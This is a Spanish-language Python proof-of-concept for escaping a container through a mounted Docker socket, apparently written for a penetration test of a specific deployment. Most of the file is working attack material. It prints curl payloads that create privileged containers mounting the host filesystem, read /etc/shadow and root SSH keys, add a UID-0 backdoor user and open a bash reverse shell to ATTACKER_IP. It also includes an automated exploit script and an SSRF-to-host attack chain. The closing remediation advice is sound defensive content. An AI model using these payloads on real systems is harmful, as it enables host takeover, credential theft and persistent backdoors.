#!/usr/bin/env python3
"""
PoC #5: Docker Socket Exposed - Container Escape
=================================================
Vulnerabilidad: docker-compose.yml línea 13
/var/run/docker.sock:/var/run/docker.sock:ro
Exponer el socket de Docker permite escape del contenedor.

Impacto:
- Escape completo del contenedor
- Control total del host Docker
- Acceso a todos los contenedores
- Ejecución de comandos como root en el host
- Compromiso total de la infraestructura

CVSS: 10.0 (Crítico)
CWE-250: Execution with Unnecessary Privileges
CWE-269: Improper Privilege Management
"""

import requests
import json
import sys

# Docker socket endpoint (si está expuesto via API)
DOCKER_API = "http://localhost:2375"  # API sin TLS
DOCKER_SOCKET = "/var/run/docker.sock"


def check_docker_api():
    """Verifica si la API de Docker está expuesta"""
    print("=" * 70)
    print("PoC #5: Docker Socket Exposure - Container Escape")
    print("=" * 70)
    print(f"\n[*] Verificando exposición de Docker API...")

    try:
        # Intentar conexión via HTTP
        response = requests.get(f"{DOCKER_API}/version", timeout=3)
        if response.status_code == 200:
            print(f"[+] Docker API EXPUESTA en {DOCKER_API}")
            print(f"[+] Versión: {response.json()}")
            return True
    except:
        pass

    print("[-] API HTTP no expuesta directamente")
    print("[*] El socket está montado internamente en el contenedor reverse-proxy")
    return False


def demonstrate_socket_exploitation():
    """Demuestra la explotación del Docker socket"""
    print("\n" + "-" * 70)
    print("EXPLOTACIÓN DEL DOCKER SOCKET")
    print("-" * 70)

    print("""
    [*] ESCENARIO: Un atacante con acceso al contenedor reverse-proxy
        puede usar el socket montado para escapar del contenedor.

    [*] PASO 1: Verificar acceso al socket (desde dentro del contenedor)

        $ ls -la /var/run/docker.sock
        srw-rw---- 1 root docker 0 /var/run/docker.sock

        $ curl --unix-socket /var/run/docker.sock http://localhost/version
        {"Platform":{"Name":"Docker Engine"},"Version":"20.10.x"...}

    [*] PASO 2: Listar contenedores

        $ curl --unix-socket /var/run/docker.sock http://localhost/containers/json
        [{"Id":"abc123...","Names":["/reverse-proxy"]...},
         {"Id":"def456...","Names":["/payment-core"]...}]

    [*] PASO 3: Crear contenedor privilegiado con acceso al host

        $ curl --unix-socket /var/run/docker.sock \\
          -X POST http://localhost/containers/create \\
          -H "Content-Type: application/json" \\
          -d '{
            "Image": "alpine",
            "Cmd": ["chroot", "/host", "bash"],
            "Privileged": true,
            "HostConfig": {
              "Binds": ["/:/host"],
              "Privileged": true
            }
          }'
        {"Id":"evil_container_id"}

    [*] PASO 4: Iniciar el contenedor malicioso

        $ curl --unix-socket /var/run/docker.sock \\
          -X POST http://localhost/containers/evil_container_id/start

    [*] PASO 5: Ejecutar comandos en el HOST

        $ curl --unix-socket /var/run/docker.sock \\
          -X POST http://localhost/containers/evil_container_id/exec \\
          -H "Content-Type: application/json" \\
          -d '{"Cmd": ["cat", "/host/etc/shadow"]}'

    [!] RESULTADO: Acceso root completo al host Docker
    """)


def demonstrate_attack_payloads():
    """Muestra payloads de ataque específicos"""
    print("\n" + "-" * 70)
    print("PAYLOADS DE ATAQUE")
    print("-" * 70)

    payloads = """
    [*] PAYLOAD 1: Leer /etc/shadow del host

        curl --unix-socket /var/run/docker.sock \\
          -X POST "http://localhost/containers/create?name=pwned" \\
          -H "Content-Type: application/json" \\
          -d '{
            "Image": "alpine",
            "Cmd": ["cat", "/host/etc/shadow"],
            "HostConfig": {"Binds": ["/:/host"]}
          }'

    [*] PAYLOAD 2: Reverse shell al host

        curl --unix-socket /var/run/docker.sock \\
          -X POST "http://localhost/containers/create" \\
          -H "Content-Type: application/json" \\
          -d '{
            "Image": "alpine",
            "Cmd": ["/bin/sh", "-c",
                    "chroot /host /bin/bash -c \\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\""],
            "HostConfig": {"Binds": ["/:/host"], "Privileged": true}
          }'

    [*] PAYLOAD 3: Crear usuario backdoor en el host

        curl --unix-socket /var/run/docker.sock \\
          -X POST "http://localhost/containers/create" \\
          -H "Content-Type: application/json" \\
          -d '{
            "Image": "alpine",
            "Cmd": ["/bin/sh", "-c",
                    "chroot /host useradd -o -u 0 -g 0 backdoor -p $(openssl passwd -1 hacked)"],
            "HostConfig": {"Binds": ["/:/host"]}
          }'

    [*] PAYLOAD 4: Robar claves SSH del host

        curl --unix-socket /var/run/docker.sock \\
          -X POST "http://localhost/containers/create" \\
          -H "Content-Type: application/json" \\
          -d '{
            "Image": "alpine",
            "Cmd": ["cat", "/host/root/.ssh/id_rsa"],
            "HostConfig": {"Binds": ["/:/host"]}
          }'

    [*] PAYLOAD 5: Acceder a otros contenedores

        # Listar todos los contenedores
        curl --unix-socket /var/run/docker.sock http://localhost/containers/json

        # Ejecutar comando en otro contenedor
        curl --unix-socket /var/run/docker.sock \\
          -X POST "http://localhost/containers/payment-core/exec" \\
          -H "Content-Type: application/json" \\
          -d '{"AttachStdout": true, "Cmd": ["env"]}'
    """
    print(payloads)


def demonstrate_automated_exploit():
    """Muestra un exploit automatizado"""
    print("\n" + "-" * 70)
    print("SCRIPT DE EXPLOTACIÓN AUTOMATIZADA")
    print("-" * 70)

    exploit_script = '''
    #!/bin/bash
    # Exploit automatizado para Docker socket exposure
    # Ejecutar desde dentro de un contenedor con acceso al socket

    SOCKET="/var/run/docker.sock"
    ATTACKER_IP="10.0.0.100"
    ATTACKER_PORT="4444"

    echo "[*] Verificando acceso al socket..."
    if [ ! -S "$SOCKET" ]; then
        echo "[-] Socket no encontrado"
        exit 1
    fi

    echo "[+] Socket encontrado!"
    echo "[*] Creando contenedor de escape..."

    # Crear contenedor privilegiado
    CONTAINER_ID=$(curl -s --unix-socket $SOCKET \\
        -X POST "http://localhost/containers/create" \\
        -H "Content-Type: application/json" \\
        -d '{
            "Image": "alpine",
            "Cmd": ["/bin/sh", "-c",
                    "apk add bash; chroot /host bash -c \\"bash -i >& /dev/tcp/'$ATTACKER_IP'/'$ATTACKER_PORT' 0>&1\\""],
            "HostConfig": {
                "Binds": ["/:/host"],
                "Privileged": true
            }
        }' | jq -r '.Id')

    echo "[+] Contenedor creado: $CONTAINER_ID"
    echo "[*] Iniciando contenedor..."

    # Iniciar contenedor
    curl -s --unix-socket $SOCKET \\
        -X POST "http://localhost/containers/$CONTAINER_ID/start"

    echo "[+] Reverse shell enviada a $ATTACKER_IP:$ATTACKER_PORT"
    echo "[!] HOST COMPROMETIDO"
    '''
    print(exploit_script)


def attack_chain_ssrf_to_docker():
    """Demuestra cadena de ataque desde SSRF"""
    print("\n" + "-" * 70)
    print("CADENA DE ATAQUE: SSRF -> DOCKER SOCKET")
    print("-" * 70)

    print("""
    [*] ESCENARIO COMPLETO DE COMPROMISO:

    1. SSRF INICIAL (worker.py)
       -> Atacante explota SSRF para alcanzar servicios internos

    2. ACCESO AL CONTENEDOR REVERSE-PROXY
       -> Via SSRF + vulnerabilidad adicional (o debug mode)
       -> Obtener shell en el contenedor Traefik

    3. DESCUBRIR DOCKER SOCKET
       $ ls -la /var/run/docker.sock
       -> Socket montado como read-only (:ro)
       -> PERO: aún permite operaciones de lectura peligrosas

    4. BYPASS DE READ-ONLY
       -> Aunque es :ro, se puede:
          - Listar todos los contenedores
          - Ver variables de entorno (secretos)
          - Ver logs de contenedores
          - Inspeccionar configuraciones

    5. SI EL SOCKET FUERA RW (común en misconfigs):
       -> Crear contenedor privilegiado
       -> Montar sistema de archivos del host
       -> Obtener root en el host
       -> COMPROMISO TOTAL

    [!] IMPACTO FINAL:
        Internet -> SSRF -> Container -> Docker Socket -> HOST ROOT
    """)


if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║  DOCKER SOCKET ESCAPE - SOLO PARA PRUEBAS AUTORIZADAS         ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

    check_docker_api()
    demonstrate_socket_exploitation()
    demonstrate_attack_payloads()
    demonstrate_automated_exploit()
    attack_chain_ssrf_to_docker()

    print("\n" + "=" * 70)
    print("RESUMEN DEL IMPACTO")
    print("=" * 70)
    print("""
    [!] VULNERABILIDAD: Docker Socket Expuesto en Contenedor

    [!] IMPACTO CRÍTICO:
        - Escape completo del contenedor
        - Acceso root al host Docker
        - Control de todos los contenedores
        - Acceso a secretos de todos los servicios
        - Movimiento lateral a toda la infraestructura
        - Persistencia a nivel de host

    [!] CADENA DE ATAQUE:
        SSRF -> Container Access -> Docker Socket -> Host Compromise

    [!] REMEDIACIÓN:
        - NUNCA montar /var/run/docker.sock en contenedores
        - Si es necesario, usar alternativas como:
          * Docker socket proxy (tecnología: https://github.com/Tecnativa/docker-socket-proxy)
          * Rootless Docker
          * Podman (sin daemon)
        - Implementar políticas de Pod Security (Kubernetes)
        - Usar gVisor o Kata Containers para aislamiento
    """)
